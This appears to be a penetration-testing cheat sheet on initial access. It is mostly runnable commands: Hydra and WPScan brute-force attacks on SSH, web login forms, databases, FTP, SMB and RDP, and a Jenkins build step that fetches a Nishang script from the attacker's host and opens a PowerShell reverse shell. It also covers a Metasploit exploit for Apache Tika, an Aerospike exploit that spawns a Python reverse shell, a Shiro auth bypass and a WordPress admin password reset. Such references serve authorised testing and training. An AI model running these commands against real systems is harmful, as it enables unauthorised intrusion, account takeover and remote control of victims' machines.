---
title: Online Password Attacks
type: note
tab: Initial Access
inputs: [Username]
outputs: [Password]
tags: [InitialAccess, Password, HTTP, SSH]
---

# Online Password Attacks

## Hydra

### Hydra SSH Nonstandard Port

#Username #SSH #InitialAccess
Brute-force SSH on a nonstandard port, then log in with the recovered password.

```sh
# Brute-force SSH on a nonstandard port.
hydra -l <USER> -P <WORDLIST> -s <PORT> ssh://<TARGET_IP>

# Try a username list against SSH on a nonstandard port.
hydra -L <USERS_FILE> -P <WORDLIST> -s <PORT> ssh://<TARGET_IP>

# Log in after recovering a valid password.
ssh <USER>@<TARGET_IP> -p <PORT>
```

### Hydra HTTP GET Auth

#Username #HTTP #InitialAccess
Brute-force an HTTP GET-auth endpoint with Hydra.

```sh
hydra -l <USER> -P <WORDLIST> <TARGET_IP> http-get /
hydra -l <USER> -P <WORDLIST> http-get://<TARGET_IP>/admin
```

### Hydra HTTP POST Form

#Username #HTTP #InitialAccess
Brute-force a web login form with Hydra's `http-post-form` module.

```sh
hydra -l <USER> -P <WORDLIST> <TARGET_IP> http-post-form "/index.php:fm_usr=^USER^&fm_pwd=^PASS^:Login failed. Invalid"

# Static username parameter example.
hydra -l <USER> -P <WORDLIST> <TARGET_HOST> http-post-form '/settings.php:user_name=<USER>&user_password=^PASS^:Invalid password'

# HTTPS form with explicit port.
hydra -L <USERS_FILE> -P <WORDLIST> \
  "https-post-form://<TARGET_IP>:<PORT>/session_login.cgi:user=^USER^&pass=^PASS^:Login failed. Invalid" \
  -f -V
```

## Hydra Services

### SSH

#Username #SSH #InitialAccess
Brute-force SSH with common Hydra options and a custom wordlist.

```sh
hydra <TARGET_IP> ssh -l <USER> -P <WORDLIST> -s 22 -vv
hydra <TARGET_IP> ssh -l root -P password.txt -t 1 -v
hydra -l <USER> -P <WORDLIST> ssh://<TARGET_IP>
hydra -L users.txt -P passwords.txt ssh://<TARGET_IP> -t 4
```

Useful small SSH wordlist:

```text
/usr/share/wordlists/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
```

### Telnet

#Username #InitialAccess
Brute-force Telnet with a username and RockYou.

```sh
hydra <TARGET_IP> telnet -l <USER> -P /usr/share/wordlists/rockyou.txt -v
```

### Databases

#Username #InitialAccess
Brute-force common database services with Hydra.

```sh
# MySQL
hydra -l <USER> -P <WORDLIST> -f -s <PORT> mysql://<TARGET_IP>

# Oracle listener
hydra -L users.txt -P passwords.txt <TARGET_IP> oracle-listener

# MongoDB
hydra -l admin -P passwords.txt <TARGET_IP> mongodb

# PostgreSQL
hydra -l postgres -P passwords.txt <TARGET_IP> postgres
```

### Network Services

#Username #InitialAccess
Brute-force common remote-access services after confirming lockout risk and service scope.

```sh
# FTP.
hydra -l <USER> -P <WORDLIST> ftp://<TARGET_IP>

# SMB.
hydra -l <USER> -P <WORDLIST> smb://<TARGET_IP>

# RDP.
hydra -l <USER> -P <WORDLIST> rdp://<TARGET_IP>

# WinRM over HTTP endpoint.
hydra -l <USER> -P <WORDLIST> <TARGET_IP> http-get /wsman
```

## Web Admin Consoles

#Username #Password #HTTP #Windows #InitialAccess
Use Jenkins build command execution to run a PowerShell reverse shell after logging in.

```sh
# Login with <USER>/<PASS>.
# Common default creds to try carefully when appropriate: admin:admin.

# Project configuration page.
http://<TARGET_IP>:<PORT>/job/<PROJECT>/configure

# Attacker: prepare Nishang PowerShell reverse shell.
wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
python3 -m http.server 80
nc -lvnp <LPORT>

# Jenkins build command.
powershell.exe iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
```

## Apache Tika CVE-2018-1335

#HTTP #Windows #Exploitation #InitialAccess
Use Metasploit for Apache Tika CVE-2018-1335 when the vulnerable endpoint is exposed.

```sh
# Open Metasploit and select the Apache Tika JP2/JScript module.
msfconsole
use windows/http/apache_tika_jp2_jscript

# Configure the target and callback listener.
set RHOSTS <TARGET_IP>
set RPORT <PORT>
set LHOST <LHOST>

# Verify and exploit if vulnerable.
check
exploit
```

## Aerospike CVE-2020-13151

#HTTP #Linux #Exploitation #InitialAccess
Exploit Aerospike CVE-2020-13151 after confirming the target heartbeat or service version.

```sh
# Check web heartbeat or service clue.
curl http://<TARGET_IP>/api/heartbeat

# Test command execution.
python cve2020-13151.py --ahost <TARGET_IP> --cmd "hostname && whoami"

# Trigger a Python reverse shell.
python cve2020-13151.py --ahost <TARGET_IP> --pythonshell --lhost <LHOST> --lport <LPORT>
```

## Apache Shiro CVE-2010-3863

#HTTP #Exploitation #InitialAccess
Test Apache Shiro CVE-2010-3863 path traversal authentication bypass.

```sh
# Test the traversal authentication bypass path.
curl -v "http://<TARGET_IP>:<PORT>/%2e/admin"

# Decode the common Shiro rememberMe value when needed.
echo "c2hpcm9sbGVkcGFzdG1lCg==" | base64 -d
```

## WordPress Access

### WordPress Access Example 1 - WPScan Password Attack

#Username #HTTP #InitialAccess
Example 1 - WPScan enumeration and password attack.

```sh
# Enumerate WordPress plugins, users, and themes.
wpscan --url http://<DOMAIN> -e p,u,t

# Password attack against one known username.
wpscan --url http://<DOMAIN> \
  --usernames <USER> \
  --passwords <WORDLIST> \
  -t 50

# Password attack against multiple usernames through XML-RPC.
wpscan --url http://<DOMAIN> \
  --usernames <USER1>,<USER2> \
  --passwords <WORDLIST> \
  --password-attack xmlrpc -t 50

# Basic admin password attack.
wpscan --url http://<DOMAIN> --usernames admin --passwords <WORDLIST>
```

### WordPress Access Example 2 - Admin Password Reset

#Password #HTTP #Linux #InitialAccess
Example 2 - Database access and admin password reset.

```sh
# Linux shell: collect DB credentials from wp-config.php first.
cat /srv/www/wordpress/wp-config.php | grep -E "DB_"

# MySQL: inspect users and reset the admin password to `admin`.
mysql -u <DB_USER> -p'<DB_PASS>' <DB_NAME> <<'EOF'
SELECT * FROM wp_users;
UPDATE wp_users SET user_pass = "21232f297a57a5a743894a0e4a801fc3" WHERE user_login = "admin";
EOF
```

`21232f297a57a5a743894a0e4a801fc3` is the WordPress MD5 value for `admin`.

## Database Login Checks

#Username #Password #InitialAccess
Check direct database logins after finding credentials or guessing service defaults.

```sh
# MySQL.
hydra -l root -P <WORDLIST> -f mysql://<TARGET_IP>
mysql -u root -h <TARGET_IP> -p --skip-ssl

# PostgreSQL.
psql -h <TARGET_IP> -U postgres
```

## VNC Access

#Password #Windows #InitialAccess
Connect to VNC and use recovered credentials for a local Windows shell when allowed.

```sh
# Attacker: connect to VNC.
xtightvncviewer <TARGET_IP>:0

# Windows shell: run as administrator after recovering the password.
runas.exe /user:administrator cmd
```

## Notes

- Adjust the failure string and form parameter names to match the real application response.
- Check lockout policy before online guessing.
